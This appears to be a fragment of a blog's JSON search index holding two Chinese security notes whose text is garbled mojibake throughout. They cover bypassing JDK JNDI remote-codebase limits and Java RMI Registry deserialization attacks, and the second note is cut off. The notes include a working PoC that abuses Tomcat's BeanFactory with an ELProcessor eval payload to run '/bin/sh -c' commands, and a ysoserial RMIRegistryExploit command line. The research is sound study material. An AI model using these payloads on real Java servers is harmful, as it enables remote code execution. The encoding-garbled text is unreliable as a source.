è¿›åˆ°dockeré‡Œå¯ä»¥çœ‹åˆ°ç”Ÿæˆäº†successæ–‡ä»¶ 0x04 åç»­å‰æ–‡ç”¨çš„ç¯å¢ƒæ˜¯JDK8u111ï¼Œåœ¨åç»­çš„JDK8u113ä»¥åŠJDK6u132, JDK7u122ä¹‹åå¢åŠ äº†å¯¹è¿œç¨‹codebaseçš„é™åˆ¶ ç³»ç»Ÿå±æ€§ com.sun.jndi.rmi.object.trustURLCodebaseã€com.sun.jndi.cosnaming.object.trustURLCodebase çš„é»˜è®¤å€¼å˜ä¸ºfalseï¼Œå³é»˜è®¤ä¸å…è®¸ä»è¿œç¨‹çš„CodebaseåŠ è½½Referenceå·¥å‚ç±»ã€‚å¦‚æœéœ€è¦å¼€å¯ RMI Registry æˆ–è€… COS Naming Service Providerçš„è¿œç¨‹ç±»åŠ è½½åŠŸèƒ½ï¼Œéœ€è¦å°†å‰é¢è¯´çš„ä¸¤ä¸ªå±æ€§å€¼è®¾ç½®ä¸ºtrueã€‚ Changelog: JDK 6u141 http://www.oracle.com/technetwork/java/javase/overview-156328.html#R160_141 JDK 7u131 http://www.oracle.com/technetwork/java/javase/7u131-relnotes-3338543.html JDK 8u121 http://www.oracle.com/technetwork/java/javase/8u121-relnotes-3315208.html æ‘˜è‡ªhttps://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html é‚£ä¹ˆå¦‚æœå­˜åœ¨è¿™æ ·ä¸€ä¸ªæ¼æ´ä½†æ˜¯åˆæ˜¯é«˜ç‰ˆæœ¬çš„JDKç¯å¢ƒï¼Œè¯¥æ€ä¹ˆè¿›è¡Œbypasså‘¢ï¼Ÿ æ‰¾åˆ°ä¸€ä¸ªå—å®³è€…æœ¬åœ°CLASSPATHä¸­çš„ç±»ä½œä¸ºæ¶æ„çš„Reference Factoryå·¥å‚ç±»ï¼Œå¹¶åˆ©ç”¨è¿™ä¸ªæœ¬åœ°çš„Factoryç±»æ‰§è¡Œå‘½ä»¤ã€‚ åˆ©ç”¨LDAPç›´æ¥è¿”å›ä¸€ä¸ªæ¶æ„çš„åºåˆ—åŒ–å¯¹è±¡ï¼ŒJNDIæ³¨å…¥ä¾ç„¶ä¼šå¯¹è¯¥å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œåˆ©ç”¨ååºåˆ—åŒ–Gadgetå®Œæˆå‘½ä»¤æ‰§è¡Œã€‚ æ‘˜è‡ªhttps://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html ä¸Šé¢çš„è¿™ç¯‡æ–‡ç« æå‡ºäº†ä¸Šé¢ä¸¤ç§æ–¹æ¡ˆæ¥è¿›è¡Œã€‚ åˆ©ç”¨åº•å±‚åè®®å®ç°ä¸Šçš„æ¼æ´å…ˆæ¥è¯´ä¸€ä¸‹ç¬¬äºŒç§ï¼Œè¿™é‡Œæåˆ°åˆ©ç”¨çš„æ˜¯LDAPï¼Œè¿™éƒ¨åˆ†æˆ‘ä»¬åé¢å†è¯¦ç»†å™è¿°ï¼Œå…¶å®åŸç†è·ŸRMIçš„ååºåˆ—åŒ–é—®é¢˜æ˜¯ä¸€æ ·çš„ã€‚ æˆ‘åœ¨æµ…è°ˆJava RMIååºåˆ—åŒ–é—®é¢˜ä¸­æ›¾æåˆ°è¿‡ï¼ŒJRMPListeneråˆ©ç”¨çš„æ˜¯RMI Clientåœ¨æ¥æ”¶Exceptionæ—¶å‘ç”Ÿçš„ååºåˆ—åŒ–æ¼æ´ã€‚è€Œè¿™é‡Œçš„JNDIåº•å±‚ç”¨çš„ä»ç„¶æ˜¯RMIé‚£å¥—(å¦‚æœåè®®æ˜¯RMIçš„è¯)ï¼Œæ‰€ä»¥æˆ‘ä»¬å‘èµ·ä¸€ä¸ªé“¾æ¥åˆ°ysoserialçš„JRMPListenerä¹Ÿè¿˜æ˜¯èƒ½æˆåŠŸåˆ©ç”¨çš„ï¼Œä¸ç®¡æœ‰æ²¡æœ‰è®¾ç½®com.sun.jndi.rmi.object.trustURLCodebaseä¸ºtrueã€‚å½“ç„¶å¦‚æœè¦åˆ©ç”¨æˆåŠŸï¼Œå‘èµ·ç«¯å¿…é¡»è¦æœ‰ååºåˆ—åŒ–åˆ©ç”¨é“¾æ‰€ä¾èµ–çš„ç»„ä»¶å¹¶ä¸”åˆé€‚çš„JDKç‰ˆæœ¬æ‰å¯ä»¥ã€‚ åˆ©ç”¨å¯åˆ©ç”¨çš„æœ¬åœ°Factoryå¯¹è±¡ç„¶åæˆ‘ä»¬æ¥ç»§ç»­çœ‹çœ‹ç¬¬ä¸€ç§æƒ…å†µ åœ¨å‰é¢åˆ†æNamingManagerçš„getObjectFactoryFromReferenceæ—¶ï¼Œæˆ‘ç•¥è¿‡äº†æœ¬åœ°çš„factoryçš„è½½å…¥éƒ¨åˆ†çš„ä»£ç  è¿™é‡Œé¦–å…ˆä¼šåœ¨æœ¬åœ°çš„CLASSPATHé‡Œæ‰¾è¿™ä¸ªfactoryNameï¼Œå¦‚æœæ‰¾åˆ°äº†ï¼Œåç»­å°±ä¸ç”¨è¿›è¡Œè¿œç¨‹åŠ è½½ã€‚æ‰€ä»¥å¦‚æœæœ¬åœ°å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå¯åˆ©ç”¨çš„factoryï¼Œä¹Ÿèƒ½çªç ´JNDIçš„è¿œç¨‹åŠ è½½çš„é™åˆ¶ã€‚ å‰é¢çš„æ–‡ç« ä¸­æåˆ°äº†tomcatï¼ˆæˆ–glassfishï¼‰ä¸­çš„BeanFactoryçš„åˆ©ç”¨ï¼Œæ¥åˆ†æä¸€ä¸‹ é¦–å…ˆåœ¨åç»­çš„è°ƒç”¨ä¸­ï¼Œfactoryçš„getObjectInstanceå‡½æ•°å°†ä¼šè¢«è°ƒç”¨ 123// ref ä¸ºæˆ‘ä»¬ä¼ å…¥çš„Reference å¯æ§// name ä¸ºfactoryçš„nameï¼Œè¿™é‡Œå°±æ˜¯æˆ‘ä»¬è‡ªå·±ä¼ªé€ çš„*EvilObj* å¯æ§factory.getObjectInstance(ref, name, nameCtx, environment); æ¥çœ‹ä¸€ä¸‹BeanFactoryä¸­getObjectInstanceå‡½æ•°çš„å®ç°ï¼Œå‡½æ•°æœ‰ç‚¹é•¿ï¼Œæˆ‘ä»¬æŒ‘é‡ç‚¹çœ‹ 123456789101112131415161718192021222324if (obj instanceof ResourceRef) &#123; try &#123; Reference ref = (Reference) obj; String beanClassName = ref.getClassName(); Class&lt;?&gt; beanClass = null; ClassLoader tcl = Thread.currentThread().getContextClassLoader(); if (tcl != null) &#123; try &#123; beanClass = tcl.loadClass(beanClassName);// è½½å…¥æŒ‡å®šclass &#125; catch(ClassNotFoundException e) &#123; &#125; &#125; else &#123; try &#123; beanClass = Class.forName(beanClassName);// è½½å…¥æŒ‡å®šclass &#125; catch(ClassNotFoundException e) &#123; e.printStackTrace(); &#125; &#125; // ... // ... Object bean = beanClass.newInstance();// å®ä¾‹åŒ– å…ˆçœ‹è¿™éƒ¨åˆ†ä»£ç ï¼Œå½“å‰æˆ‘ä»¬ä¼ å…¥çš„Referenceå¿…é¡»æ˜¯ResourceRefå¯¹è±¡ï¼Œå¹¶åœ¨åç»­åŠ è½½ResourceRefçš„beanClasså’ŒshilihuanewInstanceè¿›è¡Œ(è€Œè¿™é‡Œçš„classæˆ‘ä»¬å¯ä»¥åœ¨èµ‹å€¼æ—¶éšæ„æŒ‡å®š)ã€‚ 123456789101112131415161718192021222324252627RefAddr ra = ref.get(\"forceString\");Map&lt;String, Method&gt; forced = new HashMap&lt;&gt;();String value;if (ra != null) &#123; value = (String)ra.getContent(); // ... /* Items are given as comma separated list */ for (String param: value.split(\",\")) &#123; param = param.trim(); index = param.indexOf('='); if (index &gt;= 0) &#123;// å¦‚æœå†…å®¹ä¸­å­˜åœ¨=ï¼Œæå–=åé¢çš„å­—ç¬¦ä¸²ä½œä¸ºå‡½æ•°å setterName = param.substring(index + 1).trim(); param = param.substring(0, index).trim(); &#125; else &#123; setterName = \"set\" + param.substring(0, 1).toUpperCase(Locale.ENGLISH) + param.substring(1); &#125; try &#123; forced.put(param, beanClass.getMethod(setterName, paramTypes)); &#125; // ... &#125;&#125; ReferenceRefå­˜åœ¨ç€å¯æ§çš„é”®å€¼å¯¹å…³ç³»ï¼Œé€šè¿‡getå‡½æ•°è·å¾—ï¼Œå¦‚ä¸Šè¿°ä»£ç ref.get(&quot;forceString&quot;)å°†ä¼šè·å¾—forceStringç›¸å¯¹åº”çš„RefAddrï¼Œé€šè¿‡è°ƒç”¨RefAddrçš„getContentå‡½æ•°å°±å¯ä»¥è·å¾—forceStringé”®å¯¹åº”çš„å€¼ã€‚ è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“forceStringå¯¹åº”çš„å†…å®¹ä¸­å­˜åœ¨=æ—¶ï¼Œå°†æˆªå–=åé¢çš„å­—ç¬¦ä¸²ä½œä¸ºåç»­è°ƒç”¨çš„å‡½æ•°åã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä»»æ„æŒ‡å®šå½“å‰å¯¹è±¡çš„ç±»å‡½æ•°äº†ã€‚forceé”®å€¼å¯¹ä¸­å°†åŒ…å«=å‰é¢çš„å†…å®¹å’Œç›¸åº”çš„Methodå¯¹è±¡ã€‚ä¾‹å¦‚test=eval,æœ€ç»ˆæˆ‘ä»¬å°†å¾—åˆ°evalçš„Methodå¯¹è±¡ 123456789101112131415161718192021222324252627282930313233Enumeration&lt;RefAddr&gt; e = ref.getAll();while (e.hasMoreElements()) &#123; ra = e.nextElement(); String propName = ra.getType(); if (propName.equals(Constants.FACTORY) || propName.equals(\"scope\") || propName.equals(\"auth\") || propName.equals(\"forceString\") || propName.equals(\"singleton\")) &#123; continue; &#125; value = (String)ra.getContent(); Object[] valueArray = new Object[1]; /* Shortcut for properties with explicitly configured setter */ Method method = forced.get(propName); if (method != null) &#123; valueArray[0] = value; try &#123; method.invoke(bean, valueArray); &#125; catch (IllegalAccessException| IllegalArgumentException| InvocationTargetException ex) &#123; throw new NamingException (\"Forced String setter \" + method.getName() + \" threw exception for property \" + propName); &#125; continue; &#125; ref.getAllè·å–äº†æ‰€æœ‰çš„RefAddrï¼Œå¯¹äºéConstants.FACTORY/scope/auth/forceString/singletonä¸”å‰æ–‡åˆè·å–ç›¸åº”çš„Methodå¯¹è±¡æ—¶ï¼Œæˆ‘ä»¬å°†è°ƒç”¨è¯¥å¯¹è±¡ï¼Œå…¶å‡½æ•°å‚æ•°ä¸ºæ­¤æ—¶RefAddrçš„å†…å®¹ã€‚æ¯”å¦‚å­˜åœ¨ä¸€ä¸ªRefAddrçš„typeä¸ºtestï¼Œå°†è°ƒç”¨å‰é¢çš„evalçš„Methodå¯¹è±¡ã€‚ åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å°±å®Œæˆäº†ä¸€æ¬¡åå°„è°ƒç”¨ï¼Œæ¥çœ‹çœ‹poc 1234567891011121314// payload from kingxResourceRef ref = new ResourceRef( \"javax.el.ELProcessor\",// bean class null, \"\", \"\", true,\"org.apache.naming.factory.BeanFactory\",// factory class null);ref.add(new StringRefAddr(\"forceString\", \"KINGX=eval\"));// evalå‡½æ•°Methodå¯¹è±¡å°†ä¼šè¢«è°ƒç”¨ref.add(new StringRefAddr(\"KINGX\", \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\")\" + \".newInstance().getEngineByName(\\\"JavaScript\\\")\" + \".eval(\\\"new java.lang.ProcessBuilder['(java.lang.String[])'](\" + \"['/bin/sh','-c','\"+ command +\"'])\" + \".start()\\\")\"));// evalå‡½æ•°çš„å‚æ•°ä¸ºä¸Šè¿°æ‰§è¡Œå‘½ä»¤çš„elè¯­å¥ 0x05 æ€»ç»“å‰é¢å¯¹JNDI with RMIåšäº†ä¸€äº›ç®€å•çš„ä»‹ç»ï¼Œå½“é‡åˆ°å¯æ§çš„JNDI lookupå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å‘èµ·JNDIé“¾æ¥åˆ°RMIæœåŠ¡ä¸Šï¼Œåˆ©ç”¨JNDI Naming Managerçš„è¿œç¨‹codebaseåŠ è½½æœºåˆ¶è½½å…¥ä»»æ„çš„bytecodesã€‚ å½“ç„¶ï¼Œå‰é¢çš„åˆ©ç”¨æ–¹å¼ä»…åœ¨JDK8u113ã€JDK6u132,ã€JDK7u122ç‰ˆæœ¬ä¹‹å‰ï¼Œå¦‚æœé‡åˆ°äº†é«˜ç‰ˆæœ¬çš„JDKï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•åˆ©ç”¨æœ¬åœ°CLASSPATHä¸­å¯åˆ©ç”¨çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œæˆ–è€…æ˜¯tomcatç¯å¢ƒä¸‹çš„å¯åˆ©ç”¨çš„ObjectFactoryã€‚ åœ¨åç»­å¯åˆ©ç”¨çš„æœ¬åœ°Factoryè¿™ä¸ªæ€è·¯ä¸Šï¼ŒåŸæ–‡ä½œè€…kingxæå‡ºæˆ–è®¸å…¶ä»–çš„ä¸­é—´ä»¶ç¯å¢ƒä¹Ÿå¯èƒ½å­˜åœ¨è¿™ç§å¯åˆ©ç”¨çš„ObjectFactoryï¼Œè¿™é‡Œç«‹ä¸ªflagï¼Œä»¥åæœ‰ç©ºäº†ä¸€å®šè¦æ‰¾æ‰¾XD"},{"title":"ã€notesã€‘æµ…è°ˆJava RMI Registryååºåˆ—åŒ–å®‰å…¨é—®é¢˜","permalink":"http://blog.0kami.cn/2020/02/06/rmi-registry-security-problem/","text":"0x00 å‰è¨€æœ¬æ–‡è®²è¿°äº†Java RMI Registry è¿œç¨‹bindå¯¹è±¡æ‰€å¸¦æ¥çš„ååºåˆ—åŒ–é—®é¢˜ï¼ŒåŒ…æ‹¬ä¸¤ä¸ªlevelï¼Œå…·ä½“è§ä¸‹é¢ 0x01 åŸç† Java RMIæµç¨‹å¯å‚è€ƒ1ï¼Œå‡ºé—®é¢˜çš„ä½ç½®åœ¨äºï¼š ä»Clientæ¥æ”¶åˆ°çš„bindæˆ–rebindçš„remote objï¼Œå°†ç”±sun/rmi/registry/RegistryImpl_Skel.java#dispatchå¤„ç† å¯ä»¥çœ‹åˆ°è·å–åˆ°çš„åºåˆ—åŒ–æ•°æ®ç›´æ¥è°ƒç”¨äº†readObjectå‡½æ•°ï¼Œå¯¼è‡´äº†å¸¸è§„çš„Javaååºåˆ—åŒ–æ¼æ´çš„è§¦å‘ã€‚ è¿™é‡Œæˆ‘ä»¬åªéœ€è¦å†™ä¸€ä¸ªbindæˆ–rebindçš„æ“ä½œï¼Œå³å¯æ”»å‡»åˆ°RMI Registryã€‚ 20200317 é”™è¯¯æ›´æ–°åœ¨å‰é¢çš„ç‰ˆæœ¬ï¼Œæˆ‘æŒ‡å‡ºå®é™…è§¦å‘çš„ä½ç½®ä¸ºsun/rmi/registry/RegistryImpl_Skel.java#dispatchï¼Œè¿™é‡Œä¹Ÿé”™ä¹Ÿå¯¹ã€‚ æ­£ç¡®çš„åœ°æ–¹åœ¨äºï¼šç¡®å®æ˜¯è¿™ä¸ªä½ç½®è°ƒç”¨è§¦å‘äº†readObjectï¼Œä½†éœ€è¦åˆé€‚çš„ç‰ˆæœ¬ã€‚ é”™è¯¯çš„åœ°æ–¹åœ¨äºï¼šåœ¨å®é™…çš„readObjectä¹‹å‰ï¼Œä¼šç»è¿‡RegistryImpl.checkAccessï¼Œè¿™éƒ¨åˆ†è°ƒç”¨å°†å¦å†³éå½“å‰æœ¬æœºåœ°å€çš„ç»‘å®šï¼Œè¿™é‡Œä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬å¦‚æœæ”»å‡»ä¸€å°ä¸»æœºçš„Registryï¼Œæ— æ³•ç›´æ¥åˆ°è¾¾Remoteçš„readObjecté˜¶æ®µã€‚ ï¼ˆpsï¼šä¹‹å‰è°ƒè¯•æ”»å‡»çš„æ—¶å€™ï¼Œç”¨çš„éƒ½æ˜¯åŒä¸€ä¸ªä¸»æœºï¼Œæ‰€ä»¥ä»–ä¹Ÿæ²¡æŠ¥è¿™ä¸ªé”™è¯¯ï¼‰ ï¼ˆpsï¼šå‡ºé—®é¢˜çš„åœ°æ–¹åœ¨äºJDK8u141ç‰ˆæœ¬ä¹‹åï¼Œæ–°å¢åŠ äº†RegistryImpl_Skelï¼Œè€Œä»¥å‰éƒ½æ˜¯åŠ¨æ€ç”Ÿæˆçš„ï¼Œå¦‚ä¸‹å›¾ï¼Œä»–æ˜¯æ²¡æœ‰åšaccessæ£€æŸ¥çš„ï¼‰ ç„¶åä»€ä¹ˆæ—¶å€™å¯¹hostè¿›è¡Œæ£€æŸ¥å‘¢ï¼Ÿ è¿™é‡Œå®é™…æ˜¯åœ¨putæ–°çš„objä¹‹å‰è¿›è¡Œçš„hostæ£€æŸ¥ï¼ˆemmmï¼Œæ‰€ä»¥æˆ‘ä»¥ä¸ºåç»­çš„ç‰ˆæœ¬ä»–çš„æ£€æŸ¥ä¹Ÿæ˜¯è¿™æ ·çš„ï¼‰ã€‚ è€ŒJDK8u141å¼€å§‹ï¼Œå•ç‹¬æ–°å¢äº†RegistryImpl_Skel.javaï¼ˆè¿™é‡Œæˆ‘ç¿»äº†ç½‘ä¸Šçš„å„ä¸ªç‰ˆæœ¬ï¼Œå‘ç°141å¼€å§‹æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œå…·ä½“ç‰ˆæœ¬ï¼‰ï¼Œè€Œä¸å†æ˜¯ä»¥å‰çš„åŠ¨æ€ç”Ÿæˆçš„æ–¹å¼æ¥åšã€‚ æ–°å¢åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨å®é™…çš„readObjectå°±ä¼šè¿›è¡Œæ£€æŸ¥hostï¼ˆç¬¬69è¡Œï¼‰ï¼Œå¦‚æœhostéæœ¬åœ°çš„ï¼Œé‚£ä¹ˆä¹Ÿå°±æ²¡æœ‰åç»­çš„readObjectè°ƒç”¨äº†ã€‚ 0x02 Level 1Level1 ä½¿ç”¨çš„æ˜¯jdk8u111ï¼Œè¯¥ç‰ˆæœ¬ä¸‹çš„RMI Registryæ¥æ”¶çš„remote objåªè¦ç»§æ‰¿äº†Remoteç±»å³å¯ï¼ˆåŸç†è§2ï¼‰ï¼Œæ²¡æœ‰å…¶ä»–çš„é™åˆ¶ã€‚ ysoserialå·¥å…·ä¸­çš„ysoserial.exploit.RMIRegisterExploité‡‡ç”¨äº†ä»£ç†Remoteç±»çš„æ–¹å¼æ¥è§£å†³è¿™ä¸ªé™åˆ¶ã€‚ ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å³å¯ java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit RMIRegisterHost RMIRegisterPort CommonsCollections7 &quot;open /System/Applications/Calculator.app&quot; ç®€å•çœ‹ä¸€ä¸‹ysoserial.exploit.RMIRegisterExploitçš„åŸç†æ ¹æ®å‰é¢æ–‡ç« ä¸­çš„åŸç†ï¼Œæˆ‘ä»¬ä¼ è¿‡å»çš„å¯¹è±¡å¿…é¡»è¦æ˜¯ä¸€ä¸ªç»§æ‰¿äº†java.rmi.Remoteæ¥å£çš„å¯¹è±¡ã€‚è¿™é‡Œysoserialå·¥å…·åˆ™ç›´æ¥åˆ©ç”¨åŠ¨æ€ä»£ç†çš„åŸç†ï¼Œå¯¹Remoteç±»åšä»£ç†ï¼Œå…¶å¤„ç†çš„handlerç”¨äº†CommonsCollectionsä¸­å¸¸ç”¨çš„AnnotationInvocationHandlerã€‚ä½†å…¶è§¦å‘ç‚¹å˜ä¸ºhandlerçš„memberValueså±æ€§è¢«ååºåˆ—åŒ–æ‰€æ‰§è¡Œçš„åˆ©ç”¨é“¾ã€‚ æ¥ä¸‹æ¥ï¼Œè¿œç¨‹bindå¯¹è±¡å°†æ„é€ å¥½çš„remoteå¯¹è±¡ä¼ è¿‡å»å³å¯ï¼Œæ¥çœ‹ä¸€ä¸‹è¿™ä¸ªä»£ç  0x03 Level 2Level2é‡‡ç”¨çš„æ˜¯ä¿®å¤åçš„ç‰ˆæœ¬jdk8u121ï¼Œä¿®å¤åçš„ç‰ˆæœ¬é‡Œï¼Œå¯¹ååºåˆ—åŒ–çš„ç±»åšäº†ç™½åå•é™åˆ¶ï¼Œè§sun/rmi/registry/RegistryImpl.java#registryFilter è¿™ä¸ªç™½åå•åŒ…æ‹¬ï¼š 12345678910111213if (String.class == clazz || java.lang.Number.class.isAssignableFrom(clazz) || Remote.class.isAssignableFrom(clazz) || java.lang.reflect.Proxy.class.isAssignableFrom(clazz) || UnicastRef.class.isAssignableFrom(clazz) || RMIClientSocketFactory.class.isAssignableFrom(clazz) || RMIServerSocketFactory.class.isAssignableFrom(clazz) || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz) || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123; return ObjectInputFilter.Status.ALLOWED;&#125; else &#123; return ObjectInputFilter.Status.REJECTED;&#125; Level1ä¸­å‘é€çš„å¯¹è±¡æ˜¯ä»£ç†åçš„AnnotationInvocationHandlerå¯¹è±¡ï¼Œå¹¶ä¸åœ¨ä¸Šè¿°å…è®¸çš„ç±»é‡Œé¢ï¼Œè¿™å¯¼è‡´åŸå…ˆysoserialå·¥å…·ä¸­çš„ysoserial.exploit.RMIRegisterExploitæ— æ³•åˆ©ç”¨ã€‚è¿™é‡Œæˆ‘ä»¬å‚è€ƒ3çš„æ–¹æ³•æ¥è¾¾æˆåˆ©ç”¨ã€‚ é¦–å…ˆæ€è·¯æ¯”è¾ƒæ˜ç¡®çš„æ˜¯ï¼Œå¦‚æœè¦ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ä¸Šè¿°çš„ç™½åå•é‡Œæ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„å¯¹è±¡ã€‚ åœ¨ç™½åå•é‡Œæˆ‘ä»¬æ³¨æ„ä¸€ä¸‹ä¸¤ä¸ªç‰¹æ®Šå¯¹è±¡Remoteå¯¹è±¡å’ŒUnicastRefå¯¹è±¡ 1. UnicastRefå¯¹è±¡æˆ‘ä»¬éƒ½çŸ¥é“RMIè¿‡ç¨‹ä¸­å­˜åœ¨å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ç«¯ä¹‹é—´çš„äº¤äº’ï¼Œé‚£ä¹ˆåœ¨ä»£ç å±‚é¢ï¼Œæˆ‘ä»¬éœ€è¦æ€ä¹ˆå»åˆ›é€ è¿™æ ·ä¸€ä¸ªé“¾æ¥å‘¢ï¼Ÿ ç”±äºæ¼æ´å‘ç”Ÿç‚¹ä¸ºå‘è¿œç¨‹æœåŠ¡å™¨æ³¨å†Œå¯¹è±¡çš„å¼•ç”¨ã€‚å›é¡¾ä¸€ä¸‹ï¼Œæˆ‘ä»¬åœ¨bindæ—¶ï¼Œä¼šå…ˆå»è·å¾—ä¸€ä¸ªRegistryï¼Œç±»ä¼¼ä¸‹é¢ 1Registry registry = LocateRegistry.getRegistry(\"192.168.98.80\"); è·Ÿè¿›java/rmi/registry/LocateRegistry.java#getRegistry æ³¨æ„åˆ°è¿™æ ·ä¸€æ®µä»£ç ï¼Œé€šè¿‡TCPEndpointæ³¨å†ŒæœåŠ¡ç«¯çš„hostã€ç«¯å£ç­‰ä¿¡æ¯ï¼Œä»¥UnicastRefå°è£…liveRef.åœ¨ä¸‹é¢createProxyæ—¶ä½¿ç”¨äº†RemoteObjectInvocationHandlerä½œä¸ºUnicastRefåŠ¨æ€ä»£ç†çš„å¤„ç†ç±» æœ€ç»ˆï¼Œæˆ‘ä»¬å°†ä»¥å®¢æˆ·ç«¯çš„èº«ä»½å»é“¾æ¥ï¼Œæ‰€ä»¥è¿™é‡Œçš„Registryä¼šæ˜¯sun/rmi/registry/RegistryImpl_Stub.java#bindå‘è¿œç¨‹RMI Registryæ³¨å†Œã€‚ newCallå‘èµ·è¿æ¥ï¼Œå¹¶å°†éœ€è¦ç»‘å®šçš„å¯¹è±¡å‘é€è¿‡å»ã€‚ åˆ°è¿™é‡Œå°±ç»“æŸäº†å‘è¿œç¨‹Registryå‘èµ·ç»‘å®šçš„æ“ä½œã€‚è¿™ä¸ªè¿‡ç¨‹ä¸­æˆ‘ä»¬ç”¨åˆ°äº†UnicastRefå¯¹è±¡ï¼Œé‚£ä¹ˆè¿™é‡Œæƒ³è±¡ä¸€ä¸‹ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶UnicastRefå¯¹è±¡é‡ŒLiveRefçš„hostå’Œportï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å‘èµ·ä»»æ„çš„RMIè¿æ¥ã€‚è¿™é‡Œå°±æ˜¯ysoserialä¸­JRMPClientçš„åŸç†ï¼Œæ¥çœ‹ä¸€ä¸‹è¿™ä¸ªpayload æ˜¯ä¸æ˜¯å¾ˆç†Ÿæ‚‰XDï¼Œä½¿ç”¨çš„æ–¹æ³•å°±æ˜¯å‰é¢ç»‘å®šè¿‡ç¨‹ä¸­çš„ä»£ç ã€‚è€Œåœ¨ç™½åå•é‡ŒUnicastRefå¯¹è±¡æ˜¯å…è®¸è¢«ååºåˆ—åŒ–çš„ã€‚ 2. RemoteObjectInvocationHandlerå¯¹è±¡å‰é¢åˆ†æåˆ°UnicastRefå¯è¢«ç”¨äºå‘èµ·RMIè¿æ¥ï¼Œä½†æ˜¯ä¸ºäº†ç¬¦åˆå‘é€çš„æ¡ä»¶ï¼Œä»ç„¶éœ€è¦æ»¡è¶³å®ç°Remoteæ¥å£çš„æ¡ä»¶ã€‚è€ŒUnicastRefå¹¶æ²¡æœ‰å®ç°Remoteæ¥å£ï¼Œè¿™å°±æ„å‘³ç€ç›´æ¥ä¼ UnicastRefæ˜¯ä¸è¡Œçš„ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å†å¤šåšä¸€æ­¥ï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•ï¼š è·ŸRMIRegisterExploitä¸€æ ·ï¼Œä½¿ç”¨Proxyåå°„æ¥å®ç°ï¼Œå…¶handlerç»§æ‰¿äºRemoteå¹¶å¤„ç†äº†æ„é€ å¥½çš„UnicastRefï¼Œè¿™é‡Œç”¨åˆ°çš„å°±æ˜¯RemoteObjectInvocationHandler æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥å°è£…UnicastRefçš„å¯¹è±¡ï¼Œå¹¶ä¸”è¯¥å¯¹è±¡è¿˜å®ç°äº†Remoteå¯¹è±¡ è¿™é‡ŒJRMPClientä½¿ç”¨çš„RemoteObjectInvocationHandlerå°±æ˜¯ç¬¬ä¸€ç§æ–¹æ³•ï¼Œæˆ‘ä»¬å°†AnnotationInvocationHandleræ›¿æ¢æˆRemoteObjectInvocationHandlerã€‚åœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨RemoteObjectInvocationHandlerçš„çˆ¶ç±»RemoteObjectçš„readObjectå‡½æ•° è¿™é‡Œçš„refå°±æ˜¯æˆ‘ä»¬ä¼ è¿›å»çš„UnicastRefï¼Œè°ƒç”¨å…¶readExternalå‡½æ•°ï¼Œè¿™é‡Œä»‹ç»ä¸€ä¸‹readExternal Javaé»˜è®¤çš„åºåˆ—åŒ–æœºåˆ¶éå¸¸ç®€å•ï¼Œè€Œä¸”åºåˆ—åŒ–åçš„å¯¹è±¡ä¸éœ€è¦å†æ¬¡è°ƒç”¨æ„é€ å™¨é‡æ–°ç”Ÿæˆï¼Œä½†æ˜¯åœ¨å®é™…ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä¼šå¸Œæœ›å¯¹è±¡çš„æŸä¸€éƒ¨åˆ†ä¸éœ€è¦è¢«åºåˆ—åŒ–ï¼Œæˆ–è€…è¯´ä¸€ä¸ªå¯¹è±¡è¢«è¿˜åŸä¹‹åï¼Œå…¶å†…éƒ¨çš„æŸäº›å­å¯¹è±¡éœ€è¦é‡æ–°åˆ›å»ºï¼Œä»è€Œä¸å¿…å°†è¯¥å­å¯¹è±¡åºåˆ—åŒ–ã€‚ åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘å®ç°Externalizableæ¥å£ä»è€Œä»£æ›¿Serializableæ¥å£æ¥å¯¹åºåˆ—åŒ–è¿‡ç¨‹è¿›è¡Œæ§åˆ¶ã€‚Externalizableæ¥å£extends Serializableæ¥å£ï¼Œè€Œä¸”åœ¨å…¶åŸºç¡€ä¸Šå¢åŠ äº†ä¸¤ä¸ªæ–¹æ³•ï¼šwriteExternal()å’ŒreadExternal()ã€‚è¿™ä¸¤ä¸ªæ–¹æ³•ä¼šåœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿˜åŸçš„è¿‡ç¨‹ä¸­è¢«è‡ªåŠ¨è°ƒç”¨ï¼Œä»¥ä¾¿æ‰§è¡Œä¸€äº›ç‰¹æ®Šçš„æ“ä½œã€‚ https://xz.aliyun.com/t/5392 è¿™é‡Œçš„readExternalå°±æ˜¯é‡æ–°åˆ›å»ºä¸€ä¸ªtcpè¿æ¥ ç»§ç»­å¾€ä¸‹è·Ÿ é‡æ–°ç”Ÿæˆä¸€ä¸ªLiveRefå¯¹è±¡åï¼Œå°†å­˜å‚¨åˆ°å½“å‰çš„ConnectionInputStreamä¸Šã€‚åç»­è¯¥streamä¼šç»§ç»­è°ƒç”¨registerRefså‡½æ•° 